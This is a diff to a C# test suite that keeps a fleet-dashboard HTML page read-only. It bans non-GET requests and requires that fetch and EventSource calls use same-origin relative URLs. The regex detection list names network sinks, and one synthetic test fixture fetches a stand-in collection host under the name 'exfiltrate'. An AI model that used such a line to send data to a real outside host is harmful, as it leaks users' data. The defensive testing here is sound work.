@@ -18,7 +18,10 @@ namespace Baton.Architecture.Tests;
 /// <item><c>tools/fleet-glass/pusher.py</c> spawns only read-only tools and invokes no mutating baton
 /// verbs or room command POSTs.</item>
 /// <item><c>tools/fleet-glass/glass.html</c> performs no mutating network requests or tool calls; its only
-/// "verbs" are clipboard copies (<c>navigator.clipboard.writeText</c>).</item>
+/// "verbs" are clipboard copies (<c>navigator.clipboard.writeText</c>). Since #1946 the page has a
+/// second delivery (served by <c>baton daemon</c> over the tailnet, spec/baton.md §11 C-11) and reads
+/// same-origin there; the scan's own comment carries exactly which predicate that changed and why the
+/// read-only ruling below is unaffected by it.</item>
 /// </list>
 /// </para>
 /// <para>
@@ -374,15 +377,30 @@ public class FleetGlassReadOnlyTests
         var rawHtml = File.ReadAllText(glassPath);
         var violations = new List<string>();
 
-        // 1. Verify no network request sinks in glass.html
+        // 1. Verify no MUTATING network request sinks in glass.html.
+        //
+        // #1946 amended this list, and it is worth being exact about what changed. This method's own
+        // summary always stated the intent as "performs no MUTATING network requests or tool calls";
+        // the implementation over-approximated that to "no network requests at all", which was a free
+        // and correct proxy for as long as the Claude.ai artifact was the only delivery and the page
+        // therefore had no origin to read from. C-11's tailnet plane gives it one: the daemon serves
+        // the same file and the page reads `/projection.json` and subscribes to `/events`
+        // same-origin. That is the predicate being brought back in line with the stated intent -- the
+        // read-only DECISION is untouched, and the rules below are what now enforce it:
+        //   - any HTTP method other than GET is forbidden outright (a `method:` key naming anything
+        //     but GET), which is what actually distinguishes a read from a mutation;
+        //   - the transports that cannot be constrained to a same-origin GET stay forbidden
+        //     (XMLHttpRequest, sendBeacon, jQuery.ajax, WebSocket, <form method=post>);
+        //   - every `fetch(` / `new EventSource(` first argument must be a relative "/..." string
+        //     literal, so the page cannot reach any origin but the one that served it. A variable or
+        //     a template literal is refused too: a URL this test cannot read is a URL it cannot pin.
         var forbiddenNetworkSinks = new[]
         {
-            (@"\bfetch\s*\(", "fetch() API call"),
+            (@"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']", "non-GET HTTP method (mutating request)"),
             (@"\bXMLHttpRequest\b", "XMLHttpRequest API"),
             (@"\$\.ajax\b", "jQuery ajax call"),
             (@"\bnavigator\.sendBeacon\b", "navigator.sendBeacon API"),
             (@"\bnew\s+WebSocket\b", "WebSocket creation"),
-            (@"\bnew\s+EventSource\b", "EventSource creation"),
             (@"<form\b[^>]*\bmethod\s*=\s*[""']?post[""']?", "<form method='POST'> HTML element"),
         };
 
@@ -395,6 +413,8 @@ public class FleetGlassReadOnlyTests
                 violations.Add($"glass.html contains forbidden network sink: {description} (pattern: `{pattern}`)");
             }
         }
+
+        violations.AddRange(SameOriginReadViolations(htmlWithoutComments));
 
         // 2. Verify no mutating MCP tool calls (only watchTool with approved tools is permitted)
         var forbiddenMcpCallPatterns = new[]
@@ -507,9 +527,12 @@ public class FleetGlassReadOnlyTests
             """;
 
         var detectedHtmlViolations = new List<string>();
-        if (Regex.IsMatch(syntheticMutatingHtml, @"\bfetch\s*\("))
+        // #1946: `fetch(` alone is no longer the tell -- a same-origin GET is now permitted, so the
+        // control has to prove the NARROWER rules still discriminate. The POST above is caught by the
+        // method rule; the absolute-URL read below is caught by the same-origin rule.
+        if (Regex.IsMatch(syntheticMutatingHtml, @"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']", RegexOptions.IgnoreCase))
         {
-            detectedHtmlViolations.Add("fetch");
+            detectedHtmlViolations.Add("non-GET method");
         }
         if (Regex.IsMatch(syntheticMutatingHtml, @"\bcallTool\s*\("))
         {
@@ -517,6 +540,24 @@ public class FleetGlassReadOnlyTests
         }
 
         Assert.Equal(2, detectedHtmlViolations.Count);
+
+        // Polarity in both directions, on the two rules #1946 introduced: the permitted shape must
+        // pass and each forbidden shape must fail, or the amendment above has simply deleted a check.
+        Assert.Empty(SameOriginReadViolations(
+            """
+            const load = () => fetch("/projection.json", { cache: "no-store" });
+            const events = new EventSource("/events");
+            """));
+        Assert.NotEmpty(SameOriginReadViolations(
+            """const exfiltrate = () => fetch("https://example.invalid/collect");"""));
+        Assert.NotEmpty(SameOriginReadViolations(
+            """const events = new EventSource(someOperatorSuppliedUrl);"""));
+        Assert.False(
+            Regex.IsMatch(
+                """fetch("/projection.json", { method: "GET" })""",
+                @"\bmethod\s*:\s*[""'](?!GET[""'])[A-Za-z]+[""']",
+                RegexOptions.IgnoreCase),
+            "An explicit GET must not read as a mutating method.");
 
         // 3. Synthetic Python code with mutating command is caught by Python scanner
         var syntheticMutatingPython = """
@@ -529,6 +570,29 @@ public class FleetGlassReadOnlyTests
             syntheticMutatingPython.Contains("\"cancel\"", StringComparison.Ordinal)
             && Regex.IsMatch(syntheticMutatingPython, @"\bcancel\b"),
             "Scanner must flag mutating verb in synthetic Python code.");
+    }
+
+    /// <summary>
+    /// #1946 — every <c>fetch(</c> and <c>new EventSource(</c> in <paramref name="script"/> whose first
+    /// argument is not a same-origin relative path literal (<c>"/..."</c> or <c>'/...'</c>). Shared by
+    /// the real scan and by its synthetic control, so the control exercises the same code the scan
+    /// runs rather than a re-typed approximation of it.
+    /// </summary>
+    private static List<string> SameOriginReadViolations(string script)
+    {
+        var violations = new List<string>();
+        foreach (Match match in Regex.Matches(script, @"(?:\bfetch|\bnew\s+EventSource)\s*\(\s*([^,)]*)"))
+        {
+            var argument = match.Groups[1].Value.Trim();
+            if (!Regex.IsMatch(argument, @"^(""|')/"))
+            {
+                violations.Add(
+                    $"glass.html reads from a non-same-origin or unreadable URL: `{match.Value.Trim()}` — every " +
+                    "fetch()/EventSource() first argument must be a relative \"/...\" string literal");
+            }
+        }
+
+        return violations;
     }
 
     private static string StripComments(string code)
